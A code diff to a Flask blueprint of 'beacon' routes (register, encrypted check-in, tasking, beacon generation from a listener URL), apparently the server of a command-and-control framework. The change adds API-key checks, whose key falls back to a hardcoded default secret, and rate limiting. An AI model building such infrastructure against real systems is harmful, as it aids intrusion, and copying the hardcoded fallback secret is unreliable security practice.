@@ -9,10 +9,30 @@ beacon_bp = Blueprint('beacon_routes', __name__)
 
 
 from core.auth import login_required
+import os
+
+BEACON_API_KEY = os.environ.get('BEACON_API_KEY', 'YGG-BEACON-KEY-SECRET')
+
+# FIX: Optional rate-limit decorator for sensitive beacon endpoints
+try:
+    from core.extensions import limiter
+    def beacon_rate_limit(limit_str):
+        def decorator(f):
+            if limiter:
+                return limiter.limit(limit_str)(f)
+            return f
+        return decorator
+except Exception:
+    def beacon_rate_limit(limit_str):
+        return lambda f: f
 
 
 @beacon_bp.route('/api/beacon/register', methods=['POST'])
 def api_beacon_register():
+    api_key = request.headers.get('X-Beacon-Key', '')
+    if api_key != BEACON_API_KEY:
+        return jsonify({"status": "error", "message": "Unauthorized"}), 401
+    
     data = request.get_json(force=True)
     if not data:
         return jsonify({"status": "error", "message": "Invalid data."})
@@ -22,6 +42,10 @@ def api_beacon_register():
 
 @beacon_bp.route('/api/beacon/checkin/<beacon_id>', methods=['POST'])
 def api_beacon_checkin(beacon_id):
+    api_key = request.headers.get('X-Beacon-Key', '')
+    if api_key != BEACON_API_KEY:
+        return jsonify({"status": "error", "message": "Unauthorized"}), 401
+        
     encrypted_data = request.get_data(as_text=True)
     if not encrypted_data:
         return jsonify({"status": "error", "message": "No data."})
@@ -67,6 +91,7 @@ def api_beacon_task():
 
 @beacon_bp.route('/api/beacon/generate', methods=['POST'])
 @login_required
+@beacon_rate_limit("10 per minute")
 def api_beacon_generate():
     data = request.get_json()
     listener_url = data.get('listener_url', '')
